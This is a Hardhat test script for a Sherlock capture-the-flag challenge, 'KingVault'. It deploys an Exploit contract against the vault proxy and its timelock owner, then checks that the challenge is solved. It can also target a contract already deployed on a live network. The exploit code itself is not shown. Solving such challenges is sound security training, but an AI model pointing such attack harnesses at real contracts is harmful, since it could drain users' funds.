import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { KingVault } from "../types";

describe("Sherlock CTF: KingVault (agusduha)", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Contract;
  let proxy: KingVault;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/agusduha/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy({ value: ethers.utils.parseEther("0.2") });
    } else {
      setup = await ethers.getContractAt(
        "contracts/agusduha/Setup.sol:Setup",
        `0x459D9C80482c541deC1Aa491209EF598BF7c9344`
      );
    }
    proxy = await ethers.getContractAt("KingVault", await setup.instance());
  });

  it("Exploit", async () => {
    // Contract Attack
    let timelockAddress = await proxy.owner();
    const ExploitFactory = await ethers.getContractFactory("contracts/agusduha/Exploit.sol:Exploit", attacker);
    const exploit = await ExploitFactory.deploy(timelockAddress, proxy.address);
    await exploit.attack();
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
